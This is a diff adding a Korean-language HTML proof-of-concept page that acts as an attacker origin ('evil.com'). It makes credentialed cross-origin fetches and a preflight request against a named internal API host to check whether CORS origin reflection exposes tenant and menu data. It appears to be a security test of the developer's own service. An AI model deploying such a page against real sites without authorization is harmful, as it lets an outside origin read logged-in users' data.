@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <title>CORS Vulnerability PoC</title>
+  <style>
+    body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
+    h1 { color: #e94560; font-size: 18px; }
+    .card { background: #16213e; border: 1px solid #0f3460; border-radius: 8px; padding: 16px; margin: 12px 0; }
+    .success { border-color: #e94560; }
+    .fail { border-color: #333; opacity: 0.6; }
+    pre { white-space: pre-wrap; word-break: break-all; font-size: 12px; line-height: 1.6; }
+    .danger { color: #e94560; font-weight: bold; }
+    .safe { color: #4ecca3; }
+    .value { color: #0ff; }
+    .label { color: #888; }
+    button { background: #e94560; color: #fff; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-size: 14px; }
+    button:hover { background: #c73e54; }
+    input { background: #0f3460; color: #fff; border: 1px solid #333; padding: 8px 12px; border-radius: 4px; width: 400px; font-family: monospace; }
+    #status { padding: 12px; margin: 12px 0; border-radius: 4px; font-size: 14px; }
+  </style>
+</head>
+<body>
+  <h1>CORS Origin Reflection PoC</h1>
+  <p>이 페이지는 <code>https://evil.com</code> 역할을 합니다. 외부 도메인에서 인증된 API를 호출할 수 있는지 테스트합니다.</p>
+
+  <div style="margin: 16px 0">
+    <label>Target URL:</label><br>
+    <input id="target" type="text" value="https://nexus.clouddev.dev.genians.kr" />
+    <button onclick="runTest()">Test CORS</button>
+  </div>
+
+  <div id="status" style="background:#0f3460">Ready</div>
+  <div id="results"></div>
+
+<script>
+var results = document.getElementById('results');
+var status = document.getElementById('status');
+
+function card(title, cls, content) {
+  var div = document.createElement('div');
+  div.className = 'card ' + cls;
+  div.innerHTML = '<b>' + title + '</b><pre>' + content + '</pre>';
+  results.appendChild(div);
+}
+
+async function runTest() {
+  results.innerHTML = '';
+  var target = document.getElementById('target').value.replace(/\/$/, '');
+  status.style.background = '#0f3460';
+  status.textContent = 'Testing CORS on ' + target + '...';
+
+  // Test 1: GET /api/tenants (public endpoint)
+  try {
+    var res = await fetch(target + '/api/tenants', {
+      headers: { 'X-Tenant-ID': 'default' },
+      credentials: 'include'
+    });
+    var data = await res.text();
+    var corsHeader = res.headers.get('access-control-allow-origin');
+
+    if (res.ok) {
+      card('Test 1: GET /api/tenants (credentials: include)',
+        'success',
+        '<span class="danger">[VULNERABLE] Cross-origin 요청 성공</span>\n' +
+        '<span class="label">Status:</span> <span class="value">' + res.status + '</span>\n' +
+        '<span class="label">ACAO:</span> <span class="value">' + corsHeader + '</span>\n' +
+        '<span class="label">Data:</span> <span class="value">' + data.substring(0, 500) + '</span>\n\n' +
+        '<span class="danger">외부 사이트에서 인증된 사용자의 데이터를 읽을 수 있습니다.</span>'
+      );
+    } else {
+      card('Test 1: GET /api/tenants', 'fail',
+        '<span class="safe">[' + res.status + '] ' + data.substring(0, 200) + '</span>'
+      );
+    }
+  } catch (e) {
+    card('Test 1: GET /api/tenants', 'fail',
+      '<span class="safe">[BLOCKED] ' + e.message + '</span>\n' +
+      'CORS가 올바르게 차단하고 있거나, 서버에 연결할 수 없습니다.'
+    );
+  }
+
+  // Test 2: GET /api/menus (with credentials)
+  try {
+    var res2 = await fetch(target + '/api/menus?flat=true', {
+      headers: { 'X-Tenant-ID': 'default' },
+      credentials: 'include'
+    });
+    var data2 = await res2.text();
+
+    if (res2.ok) {
+      card('Test 2: GET /api/menus (credentials: include)',
+        'success',
+        '<span class="danger">[VULNERABLE] 메뉴 목록 조회 성공</span>\n' +
+        '<span class="label">Data:</span> <span class="value">' + data2.substring(0, 500) + '</span>'
+      );
+    } else {
+      card('Test 2: GET /api/menus', 'fail',
+        '<span class="safe">[' + res2.status + ']</span>'
+      );
+    }
+  } catch (e) {
+    card('Test 2: GET /api/menus', 'fail',
+      '<span class="safe">[BLOCKED] ' + e.message + '</span>'
+    );
+  }
+
+  // Test 3: Preflight OPTIONS
+  try {
+    var res3 = await fetch(target + '/api/tenants', {
+      method: 'OPTIONS',
+      headers: {
+        'Access-Control-Request-Method': 'POST',
+        'Access-Control-Request-Headers': 'content-type,authorization,x-tenant-id'
+      }
+    });
+    var acao = res3.headers.get('access-control-allow-origin');
+    var acac = res3.headers.get('access-control-allow-credentials');
+
+    card('Test 3: OPTIONS preflight', res3.ok ? 'success' : 'fail',
+      '<span class="label">Status:</span> <span class="value">' + res3.status + '</span>\n' +
+      '<span class="label">Allow-Origin:</span> <span class="value">' + acao + '</span>\n' +
+      '<span class="label">Allow-Credentials:</span> <span class="value">' + acac + '</span>\n' +
+      (acao && acao !== 'null'
+        ? '<span class="danger">Origin이 반사되고 있습니다 → POST/PUT/DELETE도 가능</span>'
+        : '<span class="safe">CORS preflight가 올바르게 차단</span>')
+    );
+  } catch (e) {
+    card('Test 3: OPTIONS preflight', 'fail',
+      '<span class="safe">[BLOCKED] ' + e.message + '</span>'
+    );
+  }
+
+  // Summary
+  var vulnCards = results.querySelectorAll('.success').length;
+  if (vulnCards > 0) {
+    status.style.background = '#e94560';
+    status.textContent = 'VULNERABLE — ' + vulnCards + '개 테스트 성공 (외부에서 API 접근 가능)';
+  } else {
+    status.style.background = '#4ecca3';
+    status.style.color = '#000';
+    status.textContent = 'SAFE — CORS가 올바르게 차단하고 있습니다.';
+  }
+}
+</script>
+</body>
+</html>
